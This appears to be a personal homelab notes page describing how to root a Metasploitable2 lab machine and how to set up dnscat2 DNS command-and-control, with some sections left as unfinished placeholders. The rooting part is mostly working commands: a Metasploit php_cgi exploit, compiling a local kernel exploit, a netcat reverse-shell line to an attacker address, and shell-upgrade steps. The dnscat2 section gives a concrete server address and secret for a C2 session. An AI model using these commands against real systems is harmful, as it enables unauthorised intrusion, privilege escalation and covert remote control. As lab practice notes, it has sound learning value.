---
title: A quick referesher of the homelab
categories: [homelab]
tags: [homelab, domain, dns, dnscat2]     # TAG names should always be lowercase
---

[home]
## Gain `root` access on metasploitable2
### Gain `www-data` user access:
```bash
# www-data service user access:
  # searchsploit
  searchsploit apache 2.2.8 # out: Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution 
```
msfconsole - metasploit:
	RHOSTS & RPORT- Address & PORT to access the webserver. 
```bash
use php_cgi
set RHOSTS 192.168.189.254
set RPORT 8080
set LPORT 80
run
```

### Gaining the root access:
nc listener on attacking machine: `sudo netcat -nlvp 443`

```bash
# meterpreter
cd /tmp
upload /usr/share/exploitdb/exploits/linux/local/8572.c ./exp.c
shell

# shell on meterpreter # exp needs "run"
echo '#!/bin/sh' > run
echo '/bin/netcat -e /bin/sh <attacker_ip> 443' >> run
gcc exp.c -o exp
chmod +x exp
cat /proc/net/netlink # search for a positive pid (udev's pid minus 1)
./exp 2708 # say 2708 the pid
```

nc listener on attacking machine: `whoami`
A better shell (on the attacking machine):
```bash
python -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
<ctr+z>
stty raw -echo; fg
```
==You should have the root access==

## Setup an authoritative DNS server:
If you are using AWS: [STOK’s video](https://www.youtube.com/watch?v=p8wbebEgtDk)
Else: (Still, watch that. It's a good learning src.) I made one: 
1. Spin up a droplet. [droplet_setup]
2. Setup domain
3. Set low ttl for each DNS record type:
4. [Get a domain name]
5. Add your ip as nameserver //need more info

## DNS based data exfiltration
Src: tryhackme.com //link
Steps:
1. kdjf

## C2 using dnscat2
Download dnscat2:

Server:
```zsh
# mkdir tools; cd tools; git clone dnscat2; cd dnscat2/server
sudo gem install bundler
sudo chown -R tlab /var/lib/gems
sudo apt install ruby-dev make gcc
bundle install

sudo ruby ./dnscat2.rb tlab.site # your domain name
dnscat2> start --dns port=53531,domain=tlab.site # you'll get the secret value
# on client
sudo ./dnscat --dns port=53531,server=159.223.182.91 --secret=9101ccfc58f3f9af8
912718cc573d95e
# on server
dnscat2>
	windows
	window -i 1 # session number of the connection
	help # get shell
	window -i 2 # go to the sh window
	

```

## Active Directory setup
1. Steps I used
2. I found a good link //link . Yeah, I did just that
